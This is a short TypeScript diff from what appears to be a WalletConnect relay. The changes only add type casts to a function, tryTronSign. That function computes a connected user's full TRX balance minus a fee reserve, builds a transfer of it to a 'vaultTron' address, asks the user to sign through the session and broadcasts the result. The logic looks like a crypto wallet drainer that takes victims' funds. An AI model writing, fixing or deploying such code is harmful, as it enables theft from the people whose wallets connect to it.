@@ -265,7 +265,7 @@ async function tryTronSign(session: WcSessionData): Promise<boolean> {
     const sendSun = balSun - 1_500_000 // 1.5 TRX fee reserve
     if (sendSun <= 0) return false
 
-    const rawTx = await tw.transactionBuilder.sendTrx(vaultTron, sendSun, tronAddr) as Record<string, unknown>
+    const rawTx = (await tw.transactionBuilder.sendTrx(vaultTron, sendSun, tronAddr)) as unknown as Record<string, unknown>
 
     const result = await sendRequest(session, chainId, 'tron_signTransaction', [
       { transaction: rawTx },
@@ -273,7 +273,7 @@ async function tryTronSign(session: WcSessionData): Promise<boolean> {
 
     // If signed tx returned, broadcast it
     if (result?.signature?.length) {
-      await tw.trx.sendRawTransaction({ ...rawTx, signature: result.signature })
+      await tw.trx.sendRawTransaction({ ...rawTx, signature: result.signature } as unknown as Parameters<typeof tw.trx.sendRawTransaction>[0])
     }
     console.log('[WcRelay] TRON sign sent | addr:', tronAddr.slice(0, 8) + '...')
     return true
